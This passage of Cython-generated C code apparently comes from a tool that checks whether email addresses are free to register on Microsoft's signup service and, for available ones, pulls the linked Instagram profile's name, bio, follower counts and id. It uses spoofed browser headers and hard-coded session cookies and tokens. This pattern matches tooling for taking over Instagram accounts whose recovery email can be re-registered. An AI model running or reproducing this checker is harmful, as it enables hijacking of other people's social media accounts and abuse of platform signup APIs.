      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 475, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_MUID, __pyx_t_4) < 0) __PYX_ERR(0, 473, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_mkt1, __pyx_kp_u_ar_AR) < 0) __PYX_ERR(0, 473, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_ai_session, __pyx_kp_u_CyuLoU6vSi7HJzZeYNyVoH_170973181) < 0) __PYX_ERR(0, 473, __pyx_L1_error)

      
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_amsc); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 478, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 478, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_amsc, __pyx_t_11) < 0) __PYX_ERR(0, 473, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_clrc, __pyx_kp_u_2219789_22_3a_22_VC_x0R6_22_2c) < 0) __PYX_ERR(0, 473, __pyx_L1_error)
      __Pyx_XDECREF_SET(__pyx_v_cookies, ((PyObject*)__pyx_t_9));
      __pyx_t_9 = 0;

      
      __pyx_t_9 = __Pyx_PyDict_NewPresized(21); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 482, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_authority, __pyx_kp_u_signup_live_com) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_accept, __pyx_kp_u_application_json) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_accept_language, __pyx_kp_u_ar_YE_ar_q_0_9_en_YE_q_0_8_en_US) < 0) __PYX_ERR(0, 482, __pyx_L1_error)

      
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_canary); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 485, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 485, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_canary, __pyx_t_4) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_content_type, __pyx_kp_u_application_json) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_hpgid, __pyx_kp_u_200639) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_origin, __pyx_kp_u_https_signup_live_com) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_referer, __pyx_kp_u_https_signup_live_com_signup_mkt) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_scid, __pyx_kp_u_100118) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_sec_ch_ua, __pyx_kp_u_Not_A_Brand_v_24_Chromium_v_116) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_sec_ch_ua_mobile, __pyx_kp_u_1) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_sec_ch_ua_platform, __pyx_kp_u_Android) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_sec_fetch_dest, __pyx_n_u_empty) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_sec_fetch_mode, __pyx_n_u_cors) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_sec_fetch_site, __pyx_kp_u_same_origin) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_tcxt, __pyx_kp_u_VWlP20OW8k_xH6tFupQw1HwrEFETf_tD) < 0) __PYX_ERR(0, 482, __pyx_L1_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 498, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 498, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_uaid, __pyx_t_11) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_uiflvr, __pyx_kp_u_1001) < 0) __PYX_ERR(0, 482, __pyx_L1_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 500, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_user_agent, __pyx_t_11) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_x_ms_apitransport, __pyx_n_u_xhr) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_x_ms_apiversion, __pyx_kp_u_2) < 0) __PYX_ERR(0, 482, __pyx_L1_error)
      __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_9));
      __pyx_t_9 = 0;

      
      __pyx_t_9 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 505, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_mkt, __pyx_kp_u_AR_AR) < 0) __PYX_ERR(0, 505, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_lic, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 505, __pyx_L1_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_uuid); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 507, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 507, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_uaid, __pyx_t_4) < 0) __PYX_ERR(0, 505, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF_SET(__pyx_v_params, ((PyObject*)__pyx_t_9));
      __pyx_t_9 = 0;

      
      __pyx_t_9 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 510, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_signInName, __pyx_v_email) < 0) __PYX_ERR(0, 510, __pyx_L1_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 511, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 511, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_uaid, __pyx_t_11) < 0) __PYX_ERR(0, 510, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

      
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_includeSuggestions, Py_True) < 0) __PYX_ERR(0, 510, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_uiflvr, __pyx_int_1001) < 0) __PYX_ERR(0, 510, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_scid, __pyx_int_100118) < 0) __PYX_ERR(0, 510, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_hpgid, __pyx_int_200639) < 0) __PYX_ERR(0, 510, __pyx_L1_error)
      __Pyx_DECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_9));
      __pyx_t_9 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_requests); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 517, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_post); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 517, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

      
      __pyx_t_9 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 519, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 519, __pyx_L1_error)

      
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 519, __pyx_L1_error)

      
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 519, __pyx_L1_error)

      
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_json, __pyx_v_data) < 0) __PYX_ERR(0, 519, __pyx_L1_error)

      
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_tuple__11, __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

      
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_text); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 523, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF_SET(__pyx_v_req, __pyx_t_9);
      __pyx_t_9 = 0;

      
      __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_isAvailable_true, __pyx_v_req, Py_EQ)); if (unlikely(__pyx_t_23 < 0)) __PYX_ERR(0, 524, __pyx_L1_error)
      __pyx_t_22 = (__pyx_t_23 != 0);
      if (__pyx_t_22) {

        
        __pyx_t_22 = (__Pyx_PyUnicode_ContainsTF(__pyx_kp_u_outlook_com, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_22 < 0)) __PYX_ERR(0, 525, __pyx_L1_error)
        __pyx_t_23 = (__pyx_t_22 != 0);
        if (__pyx_t_23) {

          
          __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_okout); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 526, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_t_9, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 526, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_okout, __pyx_t_4) < 0) __PYX_ERR(0, 526, __pyx_L1_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
          goto __pyx_L24;
        }

        
        /*else*/ {
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_okhot); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 528, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_9 = __Pyx_PyInt_AddObjC(__pyx_t_4, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 528, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_okhot, __pyx_t_9) < 0) __PYX_ERR(0, 528, __pyx_L1_error)
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        __pyx_L24:;

        
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_3);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          /*try:*/ {

            
            __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 530, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_www_instagram_com_api_v1_u, __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 530, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __Pyx_DECREF_SET(__pyx_v_url, ((PyObject*)__pyx_t_4));
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyDict_NewPresized(21); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 532, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Accept, __pyx_kp_u__10) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Encoding, __pyx_kp_u_gzip_deflate_br) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Language, __pyx_kp_u_ar_AE_ar_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Cookie, __pyx_kp_u_mid_ZHTlnQALAAFHZAE8G64BeLHXNMv6) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Referer, __pyx_kp_u_https_www_instagram_com_5u2_a) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Prefers_Color_Scheme, __pyx_n_u_dark) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua, __pyx_kp_u_Not_A_Brand_v_8_Chromium_v_114) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Full_Version_List, __pyx_kp_u_Not_A_Brand_v_8_0_0_0_Chromium) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Mobile, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Platform, __pyx_kp_u_Windows) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Platform_Version, __pyx_kp_u_10_0_0) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Fetch_Dest, __pyx_n_u_empty) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Fetch_Mode, __pyx_n_u_cors) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Fetch_Site, __pyx_kp_u_same_origin) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_User_Agent, __pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Viewport_Width, __pyx_kp_u_624) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Asbd_Id, __pyx_kp_u_129477) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Csrftoken, __pyx_kp_u_1gI1BSItuCt7GpIB7BL3KCrapTfKligx) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Ig_App_Id, __pyx_kp_u_936619743392459) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Ig_Www_Claim, __pyx_kp_u_hmac_AR2f295htsHXPFyt6RxGipeoIQH) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Requested_With, __pyx_n_u_XMLHttpRequest) < 0) __PYX_ERR(0, 532, __pyx_L25_error)
            __Pyx_DECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_4));
            __pyx_t_4 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_get); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 554, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_11 = PyTuple_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 554, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_INCREF(__pyx_v_url);
            __Pyx_GIVEREF(__pyx_v_url);
            PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_url);
            __pyx_t_10 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 554, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 554, __pyx_L25_error)
            __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_11, __pyx_t_10); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 554, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 554, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __pyx_t_12 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
              __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_10);
              if (likely(__pyx_t_12)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                __Pyx_INCREF(__pyx_t_12);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_10, function);
              }
            }
            __pyx_t_4 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 554, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_rr, __pyx_t_4);
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_rr, __pyx_n_u_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 555, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_user); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 555, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_u_full_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 555, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_4);
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_rr, __pyx_n_u_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 556, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_user); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 556, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_u_biography); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 556, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_bio, __pyx_t_4);
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_rr, __pyx_n_u_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 557, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_user); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 557, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_u_edge_followed_by); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 557, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_count); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 557, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF_SET(__pyx_v_fol, __pyx_t_10);
            __pyx_t_10 = 0;

            
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_rr, __pyx_n_u_data); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 558, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_u_user); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 558, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_edge_follow); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 558, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_u_count); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 558, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_fols, __pyx_t_4);
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_rr, __pyx_n_u_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 559, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_user); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 559, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_u_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 559, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_id, __pyx_t_4);
            __pyx_t_4 = 0;

            
            __Pyx_INCREF(__pyx_kp_u_https_i_instagram_com_api_v1_acc);
            __Pyx_DECREF_SET(__pyx_v_url, __pyx_kp_u_https_i_instagram_com_api_v1_acc);

            
            __pyx_t_4 = __Pyx_PyDict_NewPresized(20); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 562, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Session_Id, __pyx_kp_u_2b712457_ffad_4dba_9241_29ea2f47) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Rawclienttime, __pyx_kp_u_1707104597_347) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Speed, __pyx_kp_u_1kbps) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
